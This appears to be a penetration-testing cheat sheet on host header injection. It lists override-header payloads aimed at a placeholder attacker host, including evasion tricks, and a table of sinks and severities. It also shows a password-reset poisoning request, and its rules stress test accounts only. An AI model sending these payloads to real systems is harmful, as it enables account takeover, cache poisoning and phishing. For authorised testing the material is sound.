# Host header injection — override headers + sinks
# TEST account only; drive password-reset for a TEST user you control, never real users.
# A finding requires the attacker host to reach a SECURITY sink (reset link / redirect / cache key /
# routing) — reflection into a non-security context is NOT a finding. Use an OOB host you own.

## Override headers to try (one variable per request; diff vs the real Host)
```
Host: ATTACKER.oob.example
X-Forwarded-Host: ATTACKER.oob.example
X-Host: ATTACKER.oob.example
X-Forwarded-Server: ATTACKER.oob.example
Forwarded: host=ATTACKER.oob.example
X-Forwarded-Proto: http            # scheme downgrade in built links
X-Original-URL: /                  # + X-Rewrite-URL: /   (path override on some stacks)
# duplicate Host — the SECOND may win on the backend behind a proxy that reads the first:
Host: TARGET
Host: ATTACKER.oob.example
# absolute-URI request line overrides Host on some servers:
GET https://ATTACKER.oob.example/reset HTTP/1.1
Host: TARGET
# host with injected userinfo / port (parser-confusion — the right half may be used downstream):
Host: TARGET@ATTACKER.oob.example
Host: ATTACKER.oob.example:443
# leading-space / tab obfuscation to slip past a naive front-end check:
<tab>X-Forwarded-Host: ATTACKER.oob.example
```

## Sinks — where the injected host becomes impact
| sink | confirm | severity |
|---|---|---|
| password-reset link | request reset for TEST user w/ injected host → the emailed token URL points to ATTACKER | High (account takeover) |
| absolute redirect / `Location` | injected host reflected into a 3xx `Location` | Medium (open-redirect / phishing) |
| absolute URLs in body/email | links/scripts/`<base>` built from Host | Medium |
| cache key (unkeyed Host) | poison a shared response → served to a different user (hand to `cache-poisoning`) | High |
| routing / internal vhost | Host routes the request to an internal app (hand to `ssrf`) | varies |
| CSP/absolute script src | injected host in a `<script src>` built from Host → XSS vector | High |

## Password-reset poisoning (the headline — benign)
```
POST /password/reset HTTP/1.1
Host: TARGET
X-Forwarded-Host: ATTACKER.oob.example
Content-Type: application/x-www-form-urlencoded

email=tester@TEST            # a TEST mailbox you control
# → read the reset email you receive; if the token URL host = ATTACKER.oob.example (or a callback
#   lands on ATTACKER.oob.example when the victim would click), the host is attacker-controlled.
# BENIGN: only your own test mailbox; prove host control, do NOT harvest a real user's token.
```

## Confirmation discipline
- A security sink is required — reflection of the header alone is not a finding.
- Cache impact: confirm cross-user via a second anonymous request → defer to `cache-poisoning`.
- Routing/SSRF: use your OOB host; a bare DNS hit is reachability-only → defer to `ssrf`.
- Never trigger resets for real users; benign markers only; redact any captured token to a fingerprint.
